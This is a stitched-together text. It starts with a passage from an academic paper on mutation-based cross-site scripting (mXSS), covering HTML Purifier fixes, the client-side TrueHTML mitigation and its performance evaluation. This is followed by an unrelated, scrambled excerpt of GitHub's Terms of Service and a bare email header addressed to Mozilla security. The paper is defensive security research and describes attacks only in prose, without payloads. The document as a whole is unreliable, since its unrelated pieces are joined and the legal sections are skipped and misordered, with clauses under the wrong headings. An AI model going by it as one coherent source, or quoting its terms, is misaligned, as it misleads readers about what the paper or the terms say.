the common percent-escaping for these characters in URLs
instead.

We have implemented these mitigation strategies in HTML
Puri(cid:12)er, a popular HTML (cid:12)ltering library [32]; as HTML
Puri(cid:12)er does not implement any anomaly detection, the (cid:12)l-
ter was fully vulnerable to these attacks. These (cid:12)xes were
reminiscent of similar security bugs that were tackled in
2010 [31] and subsequent releases in 2011 and 2012. In that
case, the set of unambiguous encodings was smaller than
that suggested by the speci(cid:12)cation, so a very delicate (cid:12)x
had to be crafted in result, both (cid:12)xing the bug and still
allowing the same level of expressiveness. Since browser
behavior varies to a great degree, a server-side mitigation
of this style is solely practical for the handling of a subset

of HTML, which would normally be allowed for high-risk
user-submitted content. Furthermore, this strategy cannot
protect against dynamically generated content, a limitation
which will be addressed in the next section. Note that prob-
lems such as the backtick-mutation still a(cid:11)ect the HTML
Puri(cid:12)er as well as Blueprint and Google Caja; they have
only just been addressed successfully by the OWASP Java
HTML Sanitizer Project 4.

5.2 Client-side mitigation

Browsers implementing ECMA Script 5 and higher of-
fer an interface for another client-side (cid:12)x. The approach
makes use of the developer-granted possibility to overwrite
the handlers of innerHTML and outerHTML-access to in-
tercept the performance optimization and, consequently, the
markup mutation process as well. Instead of permitting a
browser to employ its own proprietary HTML optimization
routines, we utilize the internal XML processor a browser
provides via DOM. The technique describing the wrapping
and sanitation process has been labeled TrueHTML.

The TrueHTML relies on the XMLSerializer DOM object
provided by all of the user agents tested. The XMLSerial-
izer can be used to perform several operations on XML doc-
uments and strings. What is interesting for our speci(cid:12)c case
is that XMLSerializer.serializeToString() will accept an
arbitrary DOM structure or node collection and transform
it into an XML string. We decided to replace the inner-
HTML-getters with an interceptor to process the accessed
contents as if they were actual XML. This has the following
bene(cid:12)ts:

1. The resulting string output is free from all mutations
described and documented in Section 3. The attack
surface can therefore be mitigated by a simple replace-
ment of the browsers’ innerHTML-access logic with
our own code. The code has been made available to a
selected group of security researches in the (cid:12)eld, who
have been tasked with ensuring its robustness and re-
liability.

2. The XMLSerializer object is a browser component.
Therefore, the performance impact is low compared
to other methods of pre-processing or (cid:12)ltering inner-
HTML-data before or after mutations take place. We
elaborate on the speci(cid:12)cs of the performance impact
in the 6 Section.

3. The solution is transparent and does not require ad-
ditional developer e(cid:11)ort, coming down to a single Java-
Script implementation. No existing JavaScript or DOM
code needs to be modi(cid:12)ed, the script hooks silently into
the necessary property accessors and replaces the in-
secure browser code. At present, the script works on
all modern browsers tested (Internet Explorer, Firefox,
Opera and Chrome) and can be extended to work on
Internet Explorer 6 or earlier versions.

4. The XMLSerializer object post-validates potentially
invalid code and thereby provides yet another level of
sanitation. That means that even insecure or non-well-
formed user-input can be (cid:12)ltered and kept free from
mutation XSS and similar attack vectors.

5. The TrueHTML approach is generic, transparent and
website-agnostic. This means that a user can utilize
this script as a core for a protective browser exten-
sion, or apply the user-script to globally protect herself
against cause and impact of mutation XSS attacks.

6. EVALUATION

This section is dedicated to description of settings and
dataset used for evaluating the performance penalty intro-
duced by TrueHTML. We focus on assessing the client-side
mitigation approach. While HTMLPuri(cid:12)er has been changed
to re(cid:13)ect determination for mitigating this class of attacks,
the new features are limited to adding items on the inter-
nal list of disallowed character combinations. This does not
measurably increase the overhead introduced by HTMLPu-
ri(cid:12)er. Performance takes a central stage as a focus of our
query, as the transfer overhead introduced by TrueHTML is
exceptionally low. The http archive 5 has analysed a set of
more than 290,000 URLs and over the course of this project
it has been determined that the average transfer size of a
single web page is more than 1,200 kilobyte, 52kB of which
are taken up by HTML content and 214kB by JavaScript.
The prototype of TrueHTML is implemented in only 820
byte of code, which we consider to be a negligible transfer
overhead.

6.1 Evaluation Environment

To assess the overhead introduced by TrueHTML in a re-
alistic scenario, we conducted an evaluation based on the
Alexa top 10,000 most popular web sites. We crawled these
sites with a recursion depth of one. As pointed out in Sec-
tion 4, approximately one third of these sites make use of
innerHTML. In a next step we determine the performance
impact of TrueHTML in a web browser by accessing 5,000
URLs randomly chosen from this set. Additionally, we assess
the performance of TrueHTML in typical useage scenarios,
like displaying an e-mail in a web mailer or accessing pop-
ular websites, as well as, investigate the relation between
page load time overhead and page size in a controlled envi-
ronment.

To demonstrate the versatility of the client-side mitiga-
tion approach, we used di(cid:11)erent hardware platforms for the
di(cid:11)erent parts of the evaluation. The Alexa tra(cid:14)c ranking
data on virtual machines constituted the grounds for per-
forming this evaluation. Each instance was assigned one
core of an Intel Xeon X5650 CPU running at 2.67GHz and
had access to 2 GB RAM. The instances ran Ubuntu 12.04
Desktop and Mozilla Firefox 14.0.1. As an example for a
mid-range system, we used a laptop with an Intel Core2Duo
CPU at 1.86GHz and 2GB RAM, running Ubuntu 12.04
Desktop and Mozilla Firefox 16.0.2, so that to assess the
performance in typical usage scenarios.

The evaluation environment is completed by a proxy server
to inject TrueHTML into the HTML context of the vis-
ited pages, and a logging infrastructure.Once a website has
been successfully loaded in the browser, we log the URL
and the user-perceived page loading time using the Navi-
gation Timing API de(cid:12)ned by the W3C Web Performance
Working Group [29]. We measure this time as the di(cid:11)er-
ence between the time when the onload event is (cid:12)red and
the time immediately after the user agent (cid:12)nishes prompt-

ing to unload the previous document, as provided by the
performance.timing.navigationStart method.

6.2 Evaluation Results

Using the virtual machines we (cid:12)rst determine the user-
perceived page loading time of the unaltered pages.
In a
second run we use the proxy server to inject TrueHTML
and measure the page loading time again. We calculate the
overhead as the increase of page loading time in percentage
ratios of the loading time the page needed without True-
HTML. The minimum overhead introduced by TrueHTML
is 0.01% while the maximum is 99.94%. On average, True-
HTML introduces an overhead of 30.62%. The median result
is 25.73%, the 90th percentile of the overhead is 68.37%.
However, the signi(cid:12)cance of these results is limited as we
are unable to control for network-induced delay. In order to
eliminate these e(cid:11)ects, we conducted the following experi-
ments locally.

Using the laptop, we determined how the user experience
is a(cid:11)ected by TrueHTML in typical scenarios, like using a
web mailer or browsing popular webpages. We therefore
assigned document.body.innerHTML of an otherwise empty
DOM to the content of a typical email body of a multi-
part message (consisting of both the content types text/-
plain and text/html), the scraped content of the landing
pages of google.com, yahoo.com, baidu.com, duckduckgo.
com, youtube.com, and the scraped content of a map dis-
play on Google Maps, as well as of a Facebook pro(cid:12)le and
a Twitter timeline. Each generated page was accessed three
times and the load times logged per criteria described earlier
on. The data were generated locally, thus the results do not
contain network-induced delays. Table 2 shows the average
values.

The results of the previous test show that the user-perceived

page load time is not only dependent on the size of the
content, but also reliant on the structure and type of the
markup. While the data show that in no case the user expe-
rience is negatively a(cid:11)ected in the typical use cases, this kind
of evaluation does not o(cid:11)er a generic insight into how True-
HTML performance overhead relates to content size and the
amount of markup elements. To evaluate this in a controlled
environment, we generate a single <p></p> markup frag-
ment that contains 1kB of text. Again, we assigned doc-
ument.body.innerHTML of an otherwise empty DOM this
markup element between one and one hundred times, cre-
ating pages containing one element with 1kB text content,
scaling up to pages containing one thousand with 1000kB of
text content. As before, the data was generated locally. We
compare page load times with and without TrueHTML as
described above. While the load time increases slightly with
size and the amount of markup elements, it can be seen from
Figure 2 that the performance penalty introduced through
TrueHTML does not raise signi(cid:12)cantly.

7. RELATED WORK
XSS. First reported back in the year 2000 [6], Cross-Site
Scripting (XSS) attacks gained recognition and attention
from a larger audience with the Samy MySpace worm in
2005 [17]. Several types of XSS attacks have been described
thus far.

Re(cid:13)ected XSS, which typically present a user with an
HTML document accessed with maliciously manipulated pa-
rameters (GET, HTTP header, cookies). These parameters
are sent to the server for application logic processing and the
document is then rendered along with the injected content.
Stored XSS, which is injected into web pages through user-
contributed content stored on the server. Without proper
processing on the server-side, scripts will be executed for
any user that visits a web page with this content.

DOM XSS, or XSS of the third kind, which was (cid:12)rst de-
scribed by Klein [18]. It may be approached as a type of
re(cid:13)ected XSS attack where the processing is done by a Java-
Script library within the browser rather than on the server.
If the malicious script is placed in the hash part of the URL,
it is not even sent to the server, meaning that server-side
protection techniques fail in that instance.

Server-side mitigation techniques range from simple char-
acter encoding or replacement, to a full rewriting of the
HTML code. The advent of DOM XSS was one of the main
reasons for introducing XSS (cid:12)lters on the client-side. The
IE8 XSS Filter was the (cid:12)rst fully integrated solution [25],
timely followed by the Chrome XSS Auditor in 2009 [4].
For Firefox, client-side XSS (cid:12)ltering is implemented through
the NoScript extension6. XSS attack mitigation has been
covered in a wide range of publications [5, 8, 9, 16, 26, 35].
Noncespaces [10] use randomized XML namespace pre(cid:12)xes
as a XSS mitigation technique, which would make detec-

6mXSS is mostly not in scope for these, thus remains unde-
tected

tion of injected content reliable. DSI [23] tries to achieve
the same goal based on a classi(cid:12)cation of HTML content
into trusted and untrusted content on the server side, sub-
sequently changing browser parsing behavior to take this
distinction into account. Blueprint [21] generates a model
of the user input on the server-side and transfers this model,
together with the user-contributed content, to the browser;
browser behavior is modi(cid:12)ed by injecting a Javascript li-
brary to process the model along with the input. While the
method to implement Blueprint in current browsers is re-
markably similar to our mitigation approach, it seems hard
to exclude the mXSS string from the model as it looks like
legitimate content. mXSS attacks are likely to bypass all
three of those defensive techniques given that the browser
itself is instrumented to create the attack payload from orig-
inally benign-looking markup.

Mutation-based Attacks. Weinberger et al. [30] give an
example where innerHTML is used to execute a DOM-based
XSS; this is a di(cid:11)erent kind of attack than those described
in this paper, because no mutations are imposed on the
content, and the content did not pass the server-side (cid:12)lter.
Comparable XSS attacks based on changes to the HTML
markup have been initially described for client-side XSS (cid:12)l-
ters. Vela Nava et al. [24] and Bates et al. [4] have shown
that the IE8 XSS Filter could once be used to "weaponize"
harmless strings and turn them into valid XSS attack vectors
by applying a mutation carried out by the regular expres-
sions used by the XSS Filter, thus circumventing server-
side protection. Zalewski covers concatenation problems
based on NUL strings in innerHTML assignments in the
Browser Security Handbook [33] and later dedicates a section
to backtick mutation in his book \The Tangled Web" [34].
Other mutation-based attacks have been reported by Barth
et al. [1] and Heiderich [13]. Here, mutation may occur after
client-side (cid:12)ltering (WebKit corrected a self-closing script
tag before rendering, thus activating the XSS vector) or
during XSS (cid:12)ltering (XSS Auditor strips the code attribute
value from an applet tag, thus activating a second malicious
code source). Hooimeijer et al. describe dangers associated
with sanitization of content [15] and claim that they were
able, for each of a large number of XSS vectors, to produce
a string that would result in that valid XSS vector after san-
itization. The vulnerabilities described by Kolbitsch et al.
may form the basis for an extremely targeted attack by web

malware [19]. Those authors state that attack vectors may
be prepared for taking into account the mutation behavior of
di(cid:11)erent browser engines. Further, our work can be seen as
another justi(cid:12)cation of the statement from Louw et al. [22]:
"The main obstacle a web application must overcome when
implementing XSS defenses is the divide between its un-
derstanding of the web content represented by an HTML
sequence and the understanding web browsers will have of
the same".

We show that there is yet another data processing layer
in the browser, which managed to remain unknown to the
web application up till now. Note that our tests showed
that Blueprint would have to be modi(cid:12)ed to be able to
handle prevention of mXSS attacks. The current status of
standardization can be retrieved from [20]. Aside from the
aforementioned \print preview problem" referenced in Sec-
tion 2.2, another early report on XSS vulnerabilities con-
nected to innerHTML was (cid:12)led in 2010 for WebKit browsers
by Vela Nava [28]. Further contributions to this problem
scope have been submitted by Silin, Hasegawa and oth-
ers, being subsequently documented on the HTML5 Security
Cheatsheet [12].

8. CONCLUSION

The paper describes a novel attack technique based on
a problematic and mostly undocumented browser behavior
that has been in existence for more than ten years { initially
introduced with Internet Explorer 4 and adopted by other
browser vendors afterwards. It identi(cid:12)es the attacks enabled
by this behavior and delivers an easily implementable solu-
tion and protection for web application developers and site-
owners. The discussed browser behavior results in a widely
usable technique for conducting XSS attacks against appli-
cations otherwise immune to HTML and JavaScript injec-
tions. These internal browser features transparently convert
benign markup, so that it becomes an XSS attack vector
once certain DOM properties { such as innerHTML and out-
erHTML { are being accessed or other DOM operations are
being performed. As we label this kind of attack Mutation-
based XSS (mXSS), we dedicate this paper to thoroughly
introducing and discussing this very attack. Subsequently,
we analyze the attack surface and propose an action plan for
mitigating the dangers via several measurements and strate-
gies for web applications, browsers and users. We also sup-
ply research-derived evaluations of the feasibility and prac-
ticability of the proposed mitigation techniques.

The insight gained from this publication indicates the
prevalence of risks and threats caused by the multilayer ap-
proach that the web is being designed with. Defensive tools
and libraries must gain awareness of the additional process-
ing layers that browsers possess. While server- as well as
client-side XSS (cid:12)lters have become highly skilled protection
tools to cover and mitigate various attack scenarios, mXSS
attacks pose a problem that has yet to be overcome by the
majority of the existing implementations. A string mutation
occurring during the communication between the single lay-
ers of the communication stack from browser to web appli-
cation and back is highly problematic. Given its place and
time of occurrence, it cannot be predicted without detailed
case analysis.

## [The GitHub Terms of Service](#the-github-terms-of-service)

Effective date: November 16, 2020

## [A. Definitions](#a-definitions)

**Short version:** *We use these basic terms throughout the agreement, and they have specific meanings. You should know what we mean when we use each of the terms. There's not going to be a test on it, but it's still useful information.*

1. An "Account" represents your legal relationship with GitHub. A “Personal Account” represents an individual User’s authorization to log in to and use the Service and serves as a User’s identity on GitHub. “Organizations” are shared workspaces that may be associated with a single entity or with one or more Users where multiple Users can collaborate across many projects at once. A Personal Account can be a member of any number of Organizations.
2. The “Agreement” refers, collectively, to all the terms, conditions, notices contained or referenced in this document (the “Terms of Service” or the "Terms") and all other operating rules, policies (including the GitHub Privacy Statement, available at [github.com/site/privacy](https://github.com/site/privacy)) and procedures that we may publish from time to time on the Website. Most of our site policies are available at [docs.github.com/categories/site-policy](/en/site-policy).
3. "Beta Previews" mean software, services, or features identified as alpha, beta, preview, early access, or evaluation, or words or phrases with similar meanings.
4. “Content” refers to content featured or displayed through the Website, including without limitation code, text, data, articles, images, photographs, graphics, software, applications, packages, designs, features, and other materials that are available on the Website or otherwise available through the Service. "Content" also includes Services. “User-Generated Content” is Content, written or otherwise, created or uploaded by our Users. "Your Content" is Content that you create or own.
5. “GitHub,” “We,” and “Us” refer to GitHub, Inc., as well as our affiliates, directors, subsidiaries, contractors, licensors, officers, agents, and employees.
6. The “Service” refers to the applications, software, products, and services provided by GitHub, including any Beta Previews.
7. “The User,” “You,” and “Your” refer to the individual person, company, or organization that has visited or is using the Website or Service; that accesses or uses any part of the Account; or that directs the use of the Account in the performance of its functions. A User must be at least 13 years of age. Special terms may apply for business or government Accounts (See [Section B(5): Additional Terms](#5-additional-terms)).
8. The “Website” refers to GitHub’s website located at [github.com](https://github.com/), and all content, services, and products provided by GitHub at or through the Website. It also refers to GitHub-owned subdomains of github.com, such as [education.github.com](https://education.github.com/) and [pages.github.com](https://pages.github.com/). These Terms also govern GitHub’s conference websites, such as [githubuniverse.com](https://githubuniverse.com/), and product websites, such as [electronjs.org](https://www.electronjs.org/). Occasionally, websites owned by GitHub may provide different or additional terms of service. If those additional terms conflict with this Agreement, the more specific terms apply to the relevant page or service.

## [B. Account Terms](#b-account-terms)

**Short version:** *Personal Accounts and Organizations have different administrative controls; a human must create your Account; you must be 13 or over; you must provide a valid email address; and you may not have more than one free Account. You alone are responsible for your Account and anything that happens while you are signed in to or using your Account. You are responsible for keeping your Account secure.*

### [1. Account Controls](#1-account-controls)

* Users. Subject to these Terms, you retain ultimate administrative control over your Personal Account and the Content within it.
* Organizations. The "owner" of an Organization that was created under these Terms has ultimate administrative control over that Organization and the Content within it. Within the Service, an owner can manage User access to the Organization’s data and projects. An Organization may have multiple owners, but there must be at least one Personal Account designated as an owner of an Organization. If you are the owner of an Organization under these Terms, we consider you responsible for the actions that are performed on or through that Organization.

### [2. Required Information](#2-required-information)

You must provide a valid email address in order to complete the signup process. Any other information requested, such as your real name, is optional, unless you are accepting these terms on behalf of a legal entity (in which case we need more information about the legal entity) or if you opt for a [paid Account](#k-payment), in which case additional information will be necessary for billing purposes.

### [3. Account Requirements](#3-account-requirements)

We have a few simple rules for Personal Accounts on GitHub's Service.

* You must be a human to create an Account. Accounts registered by "bots" or other automated methods are not permitted. We do permit machine accounts:
* A machine account is an Account set up by an individual human who accepts the Terms on behalf of the Account, provides a valid email address, and is responsible for its actions. A machine account is used exclusively for performing automated tasks. Multiple users may direct the actions of a machine account, but the owner of the Account is ultimately responsible for the machine's actions. You may maintain no more than one free machine account in addition to your free Personal Account.
* One person or legal entity may maintain no more than one free Account (if you choose to control a machine account as well, that's fine, but it can only be used for running a machine).
* You must be age 13 or older. While we are thrilled to see brilliant young coders get excited by learning to program, we must comply with United States law. GitHub does not target our Service to children under 13, and we do not permit any Users under 13 on our Service. If we learn of any User under the age of 13, we will [terminate that User’s Account immediately](#l-cancellation-and-termination). If you are a resident of a country outside the United States, your country’s minimum age may be older; in such a case, you are responsible for complying with your country’s laws.
* Your login may only be used by one person — i.e., a single login may not be shared by multiple people. A paid Organization may only provide access to as many Personal Accounts as your subscription allows.
* You may not use GitHub in violation of export control or sanctions laws of the United States or any other applicable jurisdiction. You may not use GitHub if you are or are working on behalf of a [Specially Designated National (SDN)](https://www.treasury.gov/resource-center/sanctions/SDN-List/Pages/default.aspx) or a person subject to similar blocking or denied party prohibitions administered by a U.S. government agency. GitHub may allow persons in certain sanctioned countries or territories to access certain GitHub services pursuant to U.S. government authorizations. For more information, please see our [Export Controls policy](/en/site-policy/other-site-policies/github-and-trade-controls).

### [4. Account Security](#4-account-security)

You are responsible for keeping your Account secure while you use our Service. We offer tools such as two-factor authentication to help you maintain your Account's security, but the content of your Account and its security are up to you.

* You are responsible for all content posted and activity that occurs under your Account (even when content is posted by others who have Accounts under your Account).
* You are responsible for maintaining the security of your Account and password. GitHub cannot and will not be liable for any loss or damage from your failure to comply with this security obligation.
* You will promptly notify GitHub by contacting us through the [GitHub Support portal](https://support.github.com/) if you become aware of any unauthorized use of, or access to, our Service through your Account, including any unauthorized use of your password or Account.

### [5. Additional Terms](#5-additional-terms)

In some situations, third parties' terms may apply to your use of GitHub. For example, you may be a member of an organization on GitHub with its own terms or license agreements; you may download an application that integrates with GitHub; or you may use GitHub to authenticate to another service. Please be aware that while these Terms are our full agreement with you, other parties' terms govern their relationships with you.

If you are a government User or otherwise accessing or using any GitHub Service in a government capacity, this [Government Amendment to GitHub Terms of Service](/en/site-policy/site-policy-deprecated/amendment-to-github-terms-of-service-applicable-to-us-federal-government-users) applies to you, and you agree to its provisions.

If you have signed up for GitHub Enterprise Cloud, the [Enterprise Cloud Addendum](/en/site-policy/site-policy-deprecated/github-enterprise-service-level-agreement) applies to you, and you agree to its provisions.

## [C. Acceptable Use](#c-acceptable-use)

**Short version:** *GitHub hosts a wide variety of collaborative projects from all over the world, and that collaboration only works when our users are able to work together in good faith. While using the service, you must follow the terms of this section, which include some restrictions on content you can post, conduct on the service, and other limitations. In short, be excellent to each other.*

Your use of the Website and Service must not violate any applicable laws, including copyright or trademark laws, export control or sanctions laws, or other laws in your jurisdiction. You are responsible for making sure that your use of the Service is in compliance with laws and any applicable regulations.

You agree that you will not under any circumstances violate our [Acceptable Use Policies](/en/site-policy/acceptable-use-policies/github-acceptable-use-policies) or [Community Guidelines](/en/site-policy/github-terms/github-community-guidelines).

## [D. User-Generated Content](#d-user-generated-content)

**Short version:** *You own content you create, but you allow us certain rights to it, so that we can display and share the content you post. You still have control over your content, and responsibility for it, and the rights you grant us are limited to those we need to provide the service. We have the right to remove content or close Accounts if we need to.*

### [1. Responsibility for User-Generated Content](#1-responsibility-for-user-generated-content)

You may create or upload User-Generated Content while using the Service. You are solely responsible for the content of, and for any harm resulting from, any User-Generated Content that you post, upload, link to or otherwise make available via the Service, regardless of the form of that Content. We are not responsible for any public display or misuse of your User-Generated Content.

### [2. GitHub May Remove Content](#2-github-may-remove-content)

We have the right to refuse or remove any User-Generated Content that, in our sole discretion, violates any laws or [GitHub terms or policies](/en/site-policy). User-Generated Content displayed on GitHub Mobile may be subject to mobile app stores' additional terms.

### [3. Ownership of Content, Right to Post, and License Grants](#3-ownership-of-content-right-to-post-and-license-grants)

You retain ownership of and responsibility for Your Content. If you're posting anything you did not create yourself or do not own the rights to, you agree that you are responsible for any Content you post; that you will only submit Content that you have the right to post; and that you will fully comply with any third party licenses relating to Content you post.

Because you retain ownership of and responsibility for Your Content, we need you to grant us — and other GitHub Users — certain legal permissions, listed in Sections D.4 — D.7. These license grants apply to Your Content. If you upload Content that already comes with a license granting GitHub the permissions we need to run our Service, no additional license is required. You understand that you will not receive any payment for any of the rights granted in Sections D.4 — D.7. The licenses you grant to us will end when you remove Your Content from our servers, unless other Users have forked it.

### [4. License Grant to Us](#4-license-grant-to-us)

We need the legal right to do things like host Your Content, publish it, and share it. You grant us and our legal successors the right to store, archive, parse, and display Your Content, and make incidental copies, as necessary to provide the Service, including improving the Service over time. This license includes the right to do things like copy it to our database and make backups; show it to you and other users; parse it into a search index or otherwise analyze it on our servers; share it with other users; and perform it, in case Your Content is something like music or video.

This license does not grant GitHub the right to sell Your Content. It also does not grant GitHub the right to otherwise distribute or use Your Content outside of our provision of the Service, except that as part of the right to archive Your Content, GitHub may permit our partners to store and archive Your Content in public repositories in connection with the [GitHub Arctic Code Vault and GitHub Archive Program](https://archiveprogram.github.com/).

### [5. License Grant to Other Users](#5-license-grant-to-other-users)

Any User-Generated Content you post publicly, including issues, comments, and contributions to other Users' repositories, may be viewed by others. By setting your repositories to be viewed publicly, you agree to allow others to view and "fork" your repositories (this means that others may make their own copies of Content from your repositories in repositories they control).

If you set your pages and repositories to be viewed publicly, you grant each User of GitHub a nonexclusive, worldwide license to use, display, and perform Your Content through the GitHub Service and to reproduce Your Content solely on GitHub as permitted through GitHub's functionality (for example, through forking). You may grant further rights if you [adopt a license](/en/communities/setting-up-your-project-for-healthy-contributions/adding-a-license-to-a-repository#including-an-open-source-license-in-your-repository). If you are uploading Content you did not create or own, you are responsible for ensuring that the Content you upload is licensed under terms that grant these permissions to other GitHub Users.

### [6. Contributions Under Repository License](#6-contributions-under-repository-license)

Whenever you add Content to a repository containing notice of a license, you license that Content under the same terms, and you agree that you have the right to license that Content under those terms. If you have a separate agreement to license that Content under different terms, such as a contributor license agreement, that agreement will supersede.

Isn't this just how it works already? Yep. This is widely accepted as the norm in the open-source community; it's commonly referred to by the shorthand "inbound=outbound". We're just making it explicit.

### [7. Moral Rights](#7-moral-rights)

You retain all moral rights to Your Content that you upload, publish, or submit to any part of the Service, including the rights of integrity and attribution. However, you waive these rights and agree not to assert them against us, to enable us to reasonably exercise the rights granted in Section D.4, but not otherwise.

To the extent this agreement is not enforceable by applicable law, you grant GitHub the rights we need to use Your Content without attribution and to make reasonable adaptations of Your Content as necessary to render the Website and provide the Service.

## [E. Private Repositories](#e-private-repositories)

**Short version:** *We treat the content of private repositories as confidential, and we only access it as described in our Privacy Statement—for security purposes, to assist the repository owner with a support matter, to maintain the integrity of the Service, to comply with our legal obligations, if we have reason to believe the contents are in violation of the law, or with your consent.*

### [1. Control of Private Repositories](#1-control-of-private-repositories)

Some Accounts may have private repositories, which allow the User to control access to Content.

### [2. Confidentiality of Private Repositories](#2-confidentiality-of-private-repositories)

GitHub considers the contents of private repositories to be confidential to you. GitHub will protect the contents of private repositories from unauthorized use, access, or disclosure in the same manner that we would use to protect our own confidential information of a similar nature and in no event with less than a reasonable degree of care.

### [3. Access](#3-access)

GitHub personnel may only access the content of your private repositories in the situations described in our [Privacy Statement](/en/site-policy/privacy-policies/github-privacy-statement#repository-contents).

You may choose to enable additional access to your private repositories. For example:

* You may enable various GitHub services or features that require additional rights to Your Content in private repositories. These rights may vary depending on the service or feature, but GitHub will continue to treat your private repository Content as confidential. If those services or features require rights in addition to those we need to provide the GitHub Service, we will provide an explanation of those rights.

Additionally, we may be [compelled by law](/en/site-policy/privacy-policies/github-privacy-statement#for-legal-disclosure) to disclose the contents of your private repositories.

GitHub will provide notice regarding our access to private repository content, unless [for legal disclosure](/en/site-policy/privacy-policies/github-privacy-statement#for-legal-disclosure), to comply with our legal obligations, or where otherwise bound by requirements under law, for automated scanning, or if in response to a security threat or other risk to security.

## [H. API Terms](#h-api-terms)

**Short version:** *You agree to these Terms of Service, plus this Section H, when using any of GitHub's APIs (Application Provider Interface), including use of the API through a third party product that accesses GitHub.*

Abuse or excessively frequent requests to GitHub via the API may result in the temporary or permanent suspension of your Account's access to the API. GitHub, in our sole discretion, will determine abuse or excessive usage of the API. We will make a reasonable attempt to warn you via email prior to suspension.

You may not share API tokens to exceed GitHub's rate limitations.

You may not use the API to download data or Content from GitHub for spamming purposes, including for the purposes of selling GitHub users' personal information, such as to recruiters, headhunters, and job boards.

All use of the GitHub API is subject to these Terms of Service and the [GitHub Privacy Statement](https://github.com/site/privacy).

GitHub may offer subscription-based access to our API for those Users who require high-throughput access or access that would result in resale of GitHub's Service.

### [1. Subject to Change](#1-subject-to-change)

Beta Previews may not be supported and may be changed at any time without notice. In addition, Beta Previews are not subject to the same security measures and auditing to which the Service has been and is subject. **By using a Beta Preview, you use it at your own risk.**

### [2. Confidentiality](#2-confidentiality)

As a user of Beta Previews, you may get access to special information that isn’t available to the rest of the world. Due to the sensitive nature of this information, it’s important for us to make sure that you keep that information secret.

**Confidentiality Obligations.** You agree that any non-public Beta Preview information we give you, such as information about a private Beta Preview, will be considered GitHub’s confidential information (collectively, “Confidential Information”), regardless of whether it is marked or identified as such. You agree to only use such Confidential Information for the express purpose of testing and evaluating the Beta Preview (the “Purpose”), and not for any other purpose. You should use the same degree of care as you would with your own confidential information, but no less than reasonable precautions to prevent any unauthorized use, disclosure, publication, or dissemination of our Confidential Information. You promise not to disclose, publish, or disseminate any Confidential Information to any third party, unless we don’t otherwise prohibit or restrict such disclosure (for example, you might be part of a GitHub-organized group discussion about a private Beta Preview feature).

**Exceptions.** Confidential Information will not include information that is: (a) or becomes publicly available without breach of this Agreement through no act or inaction on your part (such as when a private Beta Preview becomes a public Beta Preview); (b) known to you before we disclose it to you; (c) independently developed by you without breach of any confidentiality obligation to us or any third party; or (d) disclosed with permission from GitHub. You will not violate the terms of this Agreement if you are required to disclose Confidential Information pursuant to operation of law, provided GitHub has been given reasonable advance written notice to object, unless prohibited by law.

### [3. Feedback](#3-feedback)

We’re always trying to improve of products and services, and your feedback as a Beta Preview user will help us do that. If you choose to give us any ideas, know-how, algorithms, code contributions, suggestions, enhancement requests, recommendations or any other feedback for our products or services (collectively, “Feedback”), you acknowledge and agree that GitHub will have a royalty-free, fully paid-up, worldwide, transferable, sub-licensable, irrevocable and perpetual license to implement, use, modify, commercially exploit and/or incorporate the Feedback into our products, services, and documentation.

### [1. Pricing](#1-pricing)

Our pricing and payment terms are available at [github.com/pricing](https://github.com/pricing). If you agree to a subscription price, that will remain your price for the duration of the payment term; however, prices are subject to change at the end of a payment term.

### [2. Upgrades, Downgrades, and Changes](#2-upgrades-downgrades-and-changes)

* We will immediately bill you when you upgrade from the free plan to any paying plan.
* If you change from a monthly billing plan to a yearly billing plan, GitHub will bill you for a full year at the next monthly billing date.
* If you upgrade to a higher level of service, we will bill you for the upgraded plan immediately.
* You may change your level of service at any time by [choosing a plan option](https://github.com/pricing) or going into your [Billing settings](https://github.com/settings/billing). If you choose to downgrade your Account, you may lose access to Content, features, or capacity of your Account. Please see our section on [Cancellation](#l-cancellation-and-termination) for information on getting a copy of that Content.

### [3. Billing Schedule; No Refunds](#3-billing-schedule-no-refunds)

**Payment Based on Plan** For monthly or yearly payment plans, the Service is billed in advance on a monthly or yearly basis respectively and is non-refundable. There will be no refunds or credits for partial months of service, downgrade refunds, or refunds for months unused with an open Account; however, the service will remain active for the length of the paid billing period. In order to treat everyone equally, no exceptions will be made.

**Payment Based on Usage** Some Service features are billed based on your usage. A limited quantity of these Service features may be included in your plan for a limited term without additional charge. If you choose to use paid Service features beyond the quantity included in your plan, you pay for those Service features based on your actual usage in the preceding month. Monthly payment for these purchases will be charged on a periodic basis in arrears. See [GitHub Additional Product Terms for Details](/en/site-policy/github-terms/github-terms-for-additional-products-and-features).

**Invoicing** For invoiced Users, User agrees to pay the fees in full, up front without deduction or setoff of any kind, in U.S. Dollars. User must pay the fees within thirty (30) days of the GitHub invoice date. Amounts payable under this Agreement are non-refundable, except as otherwise provided in this Agreement. If User fails to pay any fees on time, GitHub reserves the right, in addition to taking any other action at law or equity, to (i) charge interest on past due amounts at 1.0% per month or the highest interest rate allowed by law, whichever is less, and to charge all expenses of recovery, and (ii) terminate the applicable order form. User is solely responsible for all taxes, fees, duties and governmental assessments (except for taxes based on GitHub's net income) that are imposed or become due in connection with this Agreement.

You can [cancel your Account at any time](/en/billing/managing-the-plan-for-your-github-account/downgrading-your-accounts-plan) by going into your Settings in the global navigation bar at the top of the screen. The Account screen provides a simple, no questions asked cancellation link. We are not able to cancel Accounts in response to an email or phone request.

### [2. Upon Cancellation](#2-upon-cancellation)

We will retain and use your information as necessary to comply with our legal obligations, resolve disputes, and enforce our agreements, but barring legal requirements, we will delete your full profile and the Content of your repositories within 90 days of cancellation or termination (though some information may remain in encrypted backups). This information cannot be recovered once your Account is canceled.

We will not delete Content that you have contributed to other Users' repositories or that other Users have forked.

### [3. GitHub May Terminate](#3-github-may-terminate)

You agree to indemnify us, defend us, and hold us harmless from and against any and all claims, liabilities, and expenses, including attorneys’ fees, arising out of your use of the Website and the Service, including but not limited to your violation of this Agreement, provided that GitHub (1) promptly gives you written notice of the claim, demand, suit or proceeding; (2) gives you sole control of the defense and settlement of the claim, demand, suit or proceeding (provided that you may not settle any claim, demand, suit or proceeding unless the settlement unconditionally releases GitHub of all liability); and (3) provides to you all reasonable assistance, at your expense.

## [Q. Changes to These Terms](#q-changes-to-these-terms)

**Short version:** *We want our users to be informed of important changes to our terms, but some changes aren't that important — we don't want to bother you every time we fix a typo. So while we may modify this agreement at any time, we will notify users of any material changes and give you time to adjust to them.*

We reserve the right, at our sole discretion, to amend these Terms of Service at any time and will update these Terms of Service in the event of any such amendments. We will notify our Users of material changes to this Agreement, such as price increases, at least 30 days prior to the change taking effect by posting a notice on our Website or sending email to the primary email address specified in your GitHub account.

From: Yaniv Nizry<Yaniv.Nizry@checkmarx.com>

To: "security@mozilla.org" <security@mozilla.org>

Hello,

